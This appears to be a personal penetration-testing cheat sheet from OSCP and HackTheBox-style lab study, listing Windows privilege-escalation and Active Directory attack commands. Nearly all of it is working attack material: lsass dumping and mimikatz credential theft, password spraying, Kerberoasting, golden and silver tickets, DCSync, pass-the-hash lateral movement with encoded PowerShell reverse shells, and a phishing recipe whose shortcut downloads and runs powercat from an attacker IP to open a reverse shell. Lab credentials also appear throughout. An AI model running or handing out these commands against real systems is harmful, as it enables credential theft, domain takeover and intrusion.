				- As which user account (principal) does this task get executed ?
				- What triggers are specified for the task ?
				- What actions are executed when one or more of these triggers are met ?
			- Enum:
				Get-ScheduledTask | Get-ScheduledTaskInfo |Where-Object {$_.NextRunTime -ne $null}|select TaskName, NextRunTime ==>> get task to search
				schtasks /query /fo LIST /v #==>> search result from above to get binary or script and user run task
				
				schtasks /query /fo TABLE #==>> same as above but split in 2 inorder to read easier
				schtasks /query /tn restore /v /fo list #==> restore is service name, return detail
				
				icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
				
			- Manual-Attack:
				- Repace binary and wait or triggers event ???
				- Un-quote path hijack work ???
		- Other:
			- Danger privilege:
				- SeImpersonatePrivilege:
					- PrintSpoofer.exe
						PrintSpoofer.exe -i -c cmd
					- Potato family
						SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
				- SeDebugPrivilege
					- Auto:
						meterpreter shell
						migrate 552 #==> 552 is winlogon.exe pid ==> SYSTEM
					- Manual(stable-shell)
						- import-module .\psgetsys.ps1; ImpersonateFromParentPid -ppid 552 -command 'c:\temp\rev443.exe';
						- ref: https://github.com/decoder-it/psgetsystem/tree/master
					- Dump credential:
						procdump.exe -accepteula -ma lsass.exe lsass.dmp
						mimikatz.exe
						sekurlsa::minidump lsass.dmp || privilege::debug
						sekurlsa::logonpasswords
				- SeBackupPrivilege
				- SeAssignPrimaryToken
				- SeLoadDriver
				- SeDebug
				- SeManageVolumePrivilege
					- ref: https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html
	- ESC 1	(AD CS): 
		- Context: (Authority.htb)
			- svc_ldap can add machine, ESC 1 vulnerable allow computer account (or account) get certificate of other user (domain-admin).
		- Kali:
			certipy find -u 'svc_ldap@authority.htb' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 # ==>> find vulnerable certificate ESC 1 this case.
			impacket-addcomputer -computer-name 'PC02' -computer-pass 'Password@123' -debug -method LDAPS -computer-group 'CN=Computers,DC=authority,DC=htb' -dc-ip 10.10.11.222 authority.htb/svc_ldap:lDaP_1n_th3_cle4r\! # ==>> creating computer name PC02
			certipy req -username 'PC02$@authority.htb' -password 'Password@123' -ca AUTHORITY-CA -dc-ip 10.10.11.222 -target authority.authority.htb -template CorpVPN -upn administrator@authority.htb -dns authority.authority.htb -debug # ==>> using PC02 to genarate admin certificate.
			certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 # ==>> Not work on this machine.
			certipy cert -pfx administrator_authority.pfx -nokey -out administrator_authority.crt # ==>> pfx to crt
			certipy cert -pfx administrator_authority.pfx -nocert -out administrator_authority.key # ==>> pfx to crt
			passthecert.py -action ldap-shell -crt administrator_authority.crt -key administrator_authority.key -domain authority.htb -dc-ip 10.10.11.222 # ==>> ldapshell
				# change_password administrator Password@123
				Got User DN: CN=Administrator,CN=Users,DC=authority,DC=htb
				Attempting to set new password of: Password@123
				Password changed successfully! ==>> done Windows PE
		- Ref:
			https://github.com/GhostPack/Certify
			https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1
			https://github.com/AlmondOffSec/PassTheCert
			https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#5485
	- ESC 7 (AD CS): 
- Active drirectory:
	- kali RDP: xfreerdp /drive:kali,/home/kali/Desktop /u:stephanie /d:corp.com /v:192.168.212.75 => stable for all version of window
				xfreerdp /drive:kali,/home/kali/Desktop /u:'web_svc' /p:'Diamond1' /d:oscp.exam /w:1366 /h:768 /proxy:socks5://127.0.0.1:1080 /cert-ignore /v:10.10.98.148
				xfreerdp connection.rdp /u:'kiosk' /p:'XEwUS^9R2Gwt8O914' /d:skylark.com /f
				rdesktop  -u 'stephanie' 192.168.198.75 => windows<7
				
				
	- net: net user => local
		   net user /domain => domain
		   net localgroup => localgroup
		   net group /domain => domain |error: This command can be used only on a Windows Domain Controller => add: /domain 
		   
	
	- Enumeration:
		- net: 
			net user /domain > return users
			net user jeffadmin /domain
			net group /domain
			net group "Sales Department" /domain
		- .NET: 
			[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() => get current domain infomation (PdcRoleOwner)	   
			- Create script query LDAP:
				function LDAPSearch {
					param ([string]$LDAPQuery)
					$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
					$DistinguishedName = ([adsi]'').distinguishedName
					$DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
					$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)
					return $DirectorySearcher.FindAll()
				}
			- Ex:
				Import-Module .\enum.ps1
				LDAPSearch -LDAPQuery 'samAccountType=805306368'
				LDAPSearch -LDAPQuery "(objectclass=group)"
				foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {$group.properties | select {$_.cn}, {$_.member}}
				$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
				$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Development Department*))"
				$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Service Personnel*))"
				LDAPSearch -LDAPQuery "(&(objectclass=group) (cn=Service Personnel*))").Properties.member
				LDAPSearch -LDAPQuery "(&(objectclass=group) (cn=Customer support))").Properties
				LDAPSearch -LDAPQuery "(&(objectclass=group) (cn=Customer support))").Properties
				LDAPSearch -LDAPQuery "(&(objectclass=user)(cn=michelle))").Properties
		- PowerView:
			Import-Module .\PowerView.ps1
			Get-NetUser
			Get-NetComputer
			Get-NetDomain
			Get-NetGroup
			Get-Net*
			Get-ADComputer "PC03" -Properties *
			
			
			Get-NetGroup -LDAPFilter "(cn=Domain admins)" 
			Get-NetUser -LDAPFilter "(cn=fred)"

			Get-NetComputer -LDAPFilter "(name=web04)"|select DistinguishedName => ldap query get DistinguishedName
			Get-NetComputer|select operatingsystem

			Find-LocalAdminAccess => find pc where current user is admin ***

			foreach($computer in $(Get-NetComputer)){Get-NetSession -ComputerName $computer.cn}

			foreach($name in $(Find-LocalAdminAccess)){$name.split(".")[0]}
			foreach($cn in $(foreach($name in $(Find-LocalAdminAccess)){$name.split(".")[0]})){Get-NetComputer -LDAPFilter "cn=$cn"}
			foreach($computer in $(Find-LocalAdminAccess)){Get-NetComputer -LDAPFilter "(cn=$($computer.Split('.')[0]))"}
			
			[System.Net.Dns]::GetHostAddresses("client74.corp.com") <=> nslookup
			[System.Net.Dns]::GetHostAddresses("web04.corp.com") <=> nslookup

			Get-NetUser -LDAPFilter "serviceprincipalname=*" || Get-NetUser -SPN => get all service accounts

			Get-ObjectAcl -Identity "Management Department" |?{$_.ActiveDirectoryRights -eq "GenericAll"}|select SecurityIdentifier,ActiveDirectoryRights
			"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104","S-1-5-32-548","S-1-5-18","S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName
			net group "Management Department" stephanie /add /domain
			net group "Management Department" stephanie /del /domain

			Find-DomainShare => find share
			Find-DomainShare|?{$_.Name -notlike "*$"}
			Find-DomainShare -CheckShareAccess => check access pwemission
			ls '\\FILES04\Important Files\'
			cat '\\FILES04\Important Files\proof.txt'
		- Sharphound:
			Import-Module .\Sharphound.ps1
			Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corpaudit" -Loop -LoopInterval 00:01:00 -LoopDuration 00:10:00
		- Ldapdomaindump:
			proxychains ldapdomaindump -u 'oscp.exam\celia.almeda' -p 7k8XHk3dMtmpnC77 -o /home/kali/stuffs/misc -n 10.10.124.140 10.10.124.140
		- LdapSearch:
			proxychains ldapsearch -x -H ldap://10.10.116.140 -D 'web_svc' -w 'Diamond1' -b "CN=USERS,DC=OSCP,DC=EXAM"
		- Bloodhound python:
			proxychains bloodhound-python -u web_svc -p 'Diamond1' -ns 10.10.124.140  -d oscp.exam -c all --zip --dns-tcp
		* Methology:
			- what do i have ? (accounts?, computer?, groups? )
				account => check account permission: Find-LocalAdminAccess
				
	- Attack Authentication:
		- Foundation:
			- NTLM authen + autho:
				
			- Kerberos authen + autho:
				
		- Password Attack:
			192.168.194.75
			- Cached Password:
				-Windows:
					- mimikatz:
						.\mimikatz.exe (admin privilage)
						privilege::debug
						proxychains crackmapexec winrm 10.10.91.154 -u 'web_svc' -p 'Diamond1'
						sekurlsa::logonpasswords
					
				-Password spray:
					- Windows:
						-Ps Script:
							function LDAPEnumUser([string]$user, [string]$password){							
								$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
								$PDC = ($domainObj.PdcRoleOwner).Name
								$SearchString = "LDAP://"
								$SearchString += $PDC + "/"
								$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
								$SearchString += $DistinguishedName
								New-Object System.DirectoryServices.DirectoryEntry($SearchString, $user, $password)
							}

							Import-Module .\LDAPEnumUser.ps1
							LDAPEnumUser -user "pete" -password "Nexus123!"
							
						-Spray-Passwords(Spray-Passwords.ps1 DomainPasswordSpray.ps1):
							.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
							
						-Kerbrute:
							.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
							
					- Kali: 
						- crackmapexec:
							crackmapexec smb 192.168.194.75 -u user.txt -p 'Nexus123!' -d corp.com --continue-on-success
							
							for num in {70..76};do echo "192.168.245.$num" >> iplists;done
							for line in $(cat iplists);do $(crackmapexec smb $line -u user.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success); done
							for pass in $(cat ./users.txt);do crackmapexec smb 10.10.11.236 -u users.txt -p $pass -d manager.htb --continue-on-success; done
							
						- Kerbrute:
							./kerbrute_linux_amd64 passwordspray -d corp.com -dc 192.168.194.70 users.txt "Nexus123\!" ==>> notwork yet !!!
							./kerbrute_linux_amd64 bruteuser -d manager.htb --dc dc01.manager.htb /usr/share/wordlists/rockyou.txt raven # manage.htb
		- AS-Req Attack:
			- Foundation:
				- Abuse Pre-authen diable to get TGT encrypt with user hash => brucefore TGT hash to get clear user password.
			-Windows: 
				./Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat (-? for more example)
			-Kali:
				impacket-GetNPUsers -dc-ip 192.168.194.70 -request -outputfile ~/Desktop/getnpuser -no-pass  corp.com/jen
				proxychains impacket-GetNPUsers -dc-ip 10.10.117.140 -request -outputfile getnpuser oscp.exam/celia.almeda:7k8XHk3dMtmpnC7
				
				hashcat -m 18200 ~/Desktop/getnpuser /usr/share/eaphammer/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
		
		- Kerberoasting:
			- Foundation:
				- Need Valid Credential
				- Abuse TGS encrypt with user running service hash => brucefore TGS to get user runnning service clear text password.
			- Windows:
				.\Rubeus.exe kerberoast /outfile:hashes.kerberoast ==>> run on windows get hash
					
				echo "\$1" >appen1.rule	
				hashcat -m 13100 ~/Desktop/kuberoast /usr/share/eaphammer/wordlists/rockyou.txt -r appen1.rule --force ==>> run on kali 
			- Kali:
				impacket-GetUserSPNs -request -dc-ip 192.168.192.70 corp.com/jeff 
				proxychains impacket-GetUserSPNs -request -dc-ip 10.10.117.140 oscp.exam/celia.almeda:7k8XHk3dMtmpnC7 ==>> get all hash service possible nice :))
				proxychains impacket-GetUserSPNs -request -dc-ip 10.10.117.140 oscp.exam/celia.almeda:7k8XHk3dMtmpnC7 ==>> get all hash service possible nice :))
				
				echo -n '$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$fac8ba410701f4........e04328f3ba8b' > kerberoating-hash
				hashcat -m 13100 ~/Desktop/kuberoast /usr/share/eaphammer/wordlists/rockyou.txt -r appen1.rule --force
				
		- Silver ticket(TGS ???):
			-Windows: (this module so fckup need more investment)
				- Ps as admin:
					./mimikatz
					privilege::debug
					sekurlsa::logonPasswords ==>> get local cached hash
				- Ps as user:
					./mimikatz
					kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
						-note: 
							/sid is domain not user
							/target web04 will not work, needs domain (.corp.com)
		 					/rc4 SPN user hash iis_service in this case
							/user the one who grants permission to use service
		- DC Sync-attack:
			- Foundation:
				- Replicating Directory Changes + Replicating Directory Changes All + Replicating Directory Changes in Filtered Set rights.
				- Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
			-Windows:
				./mimikatz
				lsadump::dcsync /user:corp\jeffadmin
				lsadump::dcsync /user:corp\administrator ==>> dump user ntlm hash
			-Kali:
				impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.245.70 ==>> login jeffadmin dump user dave ntml hash.
																															==>> there are more dump options.
	- AD Lateral Movement:
		- Horizontal:
			- **Condition**: Local Admin and Domain User
			- Windows Management Instrumentation(WMI) + Windows Remote Shell(WinRs):
				- Foundation:
					- Know: (Username) && (password in clear text) && (User is local admin) && (User is domain user) ==>> user or remote user ???
					- UAC remote restrictions makes user in admin local-admin-group can't using admin privelege on remote machine but (domain user + local admin) can.
					- Wmi service starts by default on window 10, 11
				- CMD:
					python3 psrevshellbase64genarator.py ==>> get Ps revshell base64
					
					wmic /node:192.168.202.73 /user:jen /password:Nexus123! process call create "calc"
					wmic /node:192.168.202.73 /user:jen /password:Nexus123! process call create "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY.....UALAAwAwBzAGUAKAApAA=="
					
					winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami" ==>> winrm port 5985-5986
					winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0.....ACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
					
				- Powershell(runas):
					$username = 'testuser'; $password = 'Password2'; $computername='192.168.202.72'; <# wmic #> 
					$Command = 'c:\temp\rev443.exe';
					$secureString = ConvertTo-SecureString $password -AsPlaintext -Force; $credential = New-Object System.Management.Automation.PSCredential $username, $secureString; $Options = New-CimSessionOption -Protocol DCOM; $Session = New-Cimsession -ComputerName $computername -Credential $credential -SessionOption $Options; Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
				
					$username = 'jen'; $password = 'Nexus123!'; $computername='192.168.202.73'; <# winrs #> 
					$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;New-PSSession -ComputerName $computername -Credential $credential;
					
					Enter-PSSession 1  <# 1 is PSsession id #> 
			
			- PsExec:
				- Foundation:
					- Know: (remote Username) && (remote user password or hash) && (ADMIN$ share must available) && (File and Printer Sharing turn on)
					- ADMIN$ share and File and Printer Sharing turn on by default on latter Windows server.
				- Powershell:
					.\PsExec64.exe -accepteula -i  \\192.168.202.74 -u corp\jen -p Nexus123! cmd ==>> RDP as user offsec -> RCE jen on file04
					.\PsExec64.exe -accepteula -i  \\file04 -u corp\jen -p Nexus123! cmd
					.\PsExec.exe -accepteula \\files04 cmd =>> current user
				- Kali:
					impacket-psexec "corp.com/jen":"Nexus123\!"@"192.168.202.73" 
					impacket-psexec -dc-ip 192.168.202.70 -hashes ":2892D26CDF84D7A70E2EB3B9F05C425E" "corp.com/Administrator"@"192.168.202.72" ==>> ":" in hash is mandatory
					
			- PassTheHash:
				- Foundation:
					- Know: (Local admin to get hash) && (remote Username) && (remote user hash-password) && (SMB 445 enable)
					- Nothing sepecial get user hash => get session with it => attack other 
				- Windows: 
					./mimikazt.exe
					privilege::debug 
					sekurlsa::logonPasswords ==>> get other hash
					sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell ==>> spawn Ps as other user with hash
				- Kali: 
					impacket-wmiexec -hashes ":2892D26CDF84D7A70E2EB3B9F05C425E" Administrator@192.168.202.72 ==>> ":" in hash is mandatory
			- PassTheTicket:
				- Foundation:
					- Know: (Local admin to export TGS) && (user with permission have session on current machine)
					- Bottom line: valid ticket can be pass to other user to use service
					- Application only check user and group that store in TGS for permission.
					- Any user that have the valid ticket can request service from application.
				- Windows:
					./mimikazt.exe
					privilege::debug
					sekurlsa::tickets /export ==>> expport all ticket ==>> condition service ticket have to exist on system (net use \\web04).
					kerberos::ptt [0;101382]-0-0-40810000-dave@cifs-web04.kirbi ==>> no admin permission needed
																				==>> Ps session as other user and import ticket to use service
			-Dcom:
				-Foundation:
					- Know: (remote local admin or remote admin ??) && (RPC port 135 enable => dcom)
				- Windows:
					$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.211.73")) ==>> if user not localadmin or remote admin connecting will throw error.
					$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
					$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAd...gBDAGwAbwBzAGUAKAApAA==","7")
			- Golden Ticket(TGT):
				- Foundation:
					- Know: (krbtgt account hash) || (local DC admin) || (DC admin)
					- Using krbtgt hash to create a ticket fake ticket that can do every thing on target machine 
				- Windows:
					./mimikatz.exe
					privelege::debug
					lsadump::lsa /patch ==>> get krbtgt Hash in DC computer and current user must be local admin or domain admin
										==>> not real in real word !!!
					lsadump::lsa /inject
					klist
					./mimikatz.exe
					kerberos::purge ==>> no admin need 
					kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
									==>> sid: is target machine in this case is DC computer
			- Shadow copies:
				- Foundation:
					- Know:
				- Windows:
					vshadow.exe -nw -p  C:
					copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak ==>> not working ????
					reg.exe save hklm\system c:\system.bak
					impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
					
					




-----------------------------------------------------------------------------------------------------------------------

Default user privelege token:
	Privilege Name                Description                          State
	============================= ==================================== ========
	SeShutdownPrivilege           Shut down the system                 Disabled
	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
	SeUndockPrivilege             Remove computer from docking station Disabled
	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
	SeTimeZonePrivilege           Change the time zone                 Disabled
	
	Privilege Name                Description                    State
	============================= ============================== =======
	SeMachineAccountPrivilege     Add workstations to domain     Enabled
	SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
	SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*System Managed Accounts Group
*Users

*__vmware__
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Cryptographic Operators
*Device Owners
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*PdwComputeNodeAccess
*Performance Log Users
*Performance Monitor Users
*Power Users
*Remote Desktop Users
*Remote Management Users
*Replicator
*SQLServer2005SQLBrowserUser$LAPTOP14
*SQLServerMSASUser$LAPTOP14$MSSQLSERVER
*System Managed Accounts Group
*Users



-----------------------------------------------------------------------------------------------------------------------
- extract file:
	zip -r nmap.zip nmap
	Expand-Archive .\nmap.zip .\
	Compress-Archive .git .\
	
- mimikatz:
	ERROR kuhl_m_lsadump_secretsOrCache ; kull_m_registry_RegOpenKeyEx (SECURITY) (0x00000005) ==> https://security.stackexchange.com/questions/259975/what-can-prevent-mimikatz-from-accessing-lsa
	cmd:
		sc create mimidrv binPath=C:\DevelopmentExecutables\mimidrv.sys type=kernel start=demand
		sc start mimidrv
	** admin to system:
		.\PsExec64.exe -i -s cmd.exe	

- run shell |runas (medtech.com\joe:Flowers1)
	PS C:\Users\dave> $password = ConvertTo-SecureString "Flowers1" -AsPlainText -Force
	PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("joe", $password)
	PS C:\Users\dave> Enter-PSSession -ComputerName dc01 -Credential $cred
	[CLIENTWK220]: PS C:\Users\daveadmin\Documents> whoami
	clientwk220\daveadmin

	S C:\Users\jeff> $username = 'joe';
	PS C:\Users\jeff> $password = 'Flowers1';
	PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
	PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
	PS C:\Users\jeff> New-PSSession -ComputerName 192.168.237.121 -Credential $credential
	
	./RunasCs.exe alaading f8gQ8fynP44ek1m3 "cmd /c whoami /all" #==> (pov.htb)better runas required .net 2.0 ??
	ref:https://github.com/antonioCoco/RunasCs
	
	
- Set permission for file
	icacls "c:\temp\rev443.exe" /grant medtech\joe:(OI)(CI)F /T

- ssh tunneling
	.\ssh.exe -N -D 0.0.0.0:9999 -p 31337 kali@172.16.237.11
	socks5 192.168.237.121 9999 >> /etc/proxychains4.conf

- account spray
	for line in $(cat iplist.txt);do proxychains -q crackmapexec smb $line -u 'joe' -p 'Flowers1' -d medtech.com --shares ; done
	
 - Insecure Service Permissions
	Use accesschk.exe to check the "user" account's permissions on the "daclsvc" service:
	C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
	RW daclsvc
			SERVICE_QUERY_STATUS
			SERVICE_QUERY_CONFIG
			SERVICE_CHANGE_CONFIG
			SERVICE_INTERROGATE
			SERVICE_ENUMERATE_DEPENDENTS
			SERVICE_START
			SERVICE_STOP
			READ_CONTROL
	Query the service and note that it runs with SYSTEM privileges
	C:\PrivEsc>sc qc daclsvc
	[SC] QueryServiceConfig SUCCESS

	SERVICE_NAME: daclsvc
			TYPE               : 10  WIN32_OWN_PROCESS 
			START_TYPE         : 3   DEMAND_START
			ERROR_CONTROL      : 1   NORMAL
			BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
			LOAD_ORDER_GROUP   : 
			TAG                : 0
			DISPLAY_NAME       : DACL Service
			DEPENDENCIES       : 
			SERVICE_START_NAME : LocalSystem
	Modify the service config and set the BINARY_PATH_NAME (binpath) to the reverse.exe executable you created:
	C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
	[SC] ChangeServiceConfig SUCCESS
	Start the service to spawn a reverse shell running with SYSTEM privileges
	C:\PrivEsc>net start daclsvc
	The service is not responding to the control function.
	C:\Windows\system32>whoami
	nt authority\system

- mimikatz impersion:
	privilege::debug
	token::list
	token::elevate /domainadmin
	token::run /process:"c:\temp\psexec.exe -accepteula -i cmd.exe"
	token::run /process:"net user /add pwnt P@ssw0rd /domain"


- Fishing attack: (ref: 24.3.2 Phishing for Access - PEN200-book)
	Step1: wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
	Step2: python3 -m http.server 8000
	Step3: create File name "config.Library-ms"
		<?xml version="1.0" encoding="UTF-8"?>
		<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
		<name>@windows.storage.dll,-34582</name>
		<version>6</version>
		<isLibraryPinned>true</isLibraryPinned>
		<iconReference>imageres.dll,-1003</iconReference>
		<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
		</templateInfo>
		<searchConnectorDescriptionList>
		<searchConnectorDescription>
		<isDefaultSaveLocation>true</isDefaultSaveLocation>
		<isSupported>false</isSupported>
		<simpleLocation>
		<url>http://192.168.45.208</url>
		</simpleLocation>
		</searchConnectorDescription>
		</searchConnectorDescriptionList>
		</libraryDescription>
	Step4: create new short cut name with name "checkthis.lnk"
		powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.208:8000/powercat.ps1'); powercat -c 192.168.45.208 -p 443 -e powershell"
	Step5:
		cp checkthis.lnk => wsgidav server
		cp config.Library-ms => current folder
		create body.txt => current folder
		cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
	Step6:
		sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.246.189 --body @body.txt --header "Subject: Problems" --suppress-data -ap
			

- Powershell:
	- Credential xml(system.management.automation.pscredential):
		- Seen: pov.htb
		- Ref: https://stackoverflow.com/questions/63639876/powershell-password-decrypt
			$SecureString = Read-Host -Prompt "Enter your Password" -AsSecureString
			$Credential = New-Object System.Management.Automation.PSCredential -ArgumentList "username",$SecureString
			$Credential | Export-Clixml -Path .\Dolphins.xml    # Horrible, horrible beings.
			$Credential = Import-Clixml -Path .\Dolphins.xml
			
		- Ref: https://stackoverflow.com/questions/63639876/powershell-password-decrypt
			$StringUsername = "batman@gotham.com"
			$SecureStringPassword = ConvertTo-SecureString -String "hackmeandistealyourbatmobile" -AsPlainText -Force
			$Credential = New-Object System.Management.Automation.PSCredential($StringUsername, $SecureStringPassword)
			Credential.GetNetworkCredential() | fl #==> clear text password
			
- gpp password(cpassword):
	- Seen: active.htb
	
			
			
- Interactive-shell:
	stty raw -echo; (stty size; cat) | nc -lvnp 443
	IEX(IWR http://10.10.0.2/win/conptyshell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 443
	
	
	stty size
	nc -lvnp 443
	
	ctrl+z
	stty raw -echo; fg[ENTER]
	IEX(IWR http://10.10.0.2/win/conptyshell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 443 -Rows 30 -Cols 120
	
- 0xdf
	When facing a Windows server with so many ports, I’ll typically start working them prioritized by my comfort level. I’ll generate a tiered list, with some rough ideas of what I might look for on each:

	Must Look AT
		SMB - Look for any open shares and see what I might find there.
		LDAP - Can I get any information without credentials?
	If those fail
		Kerberos - Can I brute force usernames? If I find any, are they AS-REP-Roast-able?
		DNS - Can I do a zone transfer? Brute force any subdomains?
		RPC - Is anonymous access possible?
	Note for creds
		WinRM - If I can find creds for a user in the Remote Management Users group, I can get a shell

	
	
	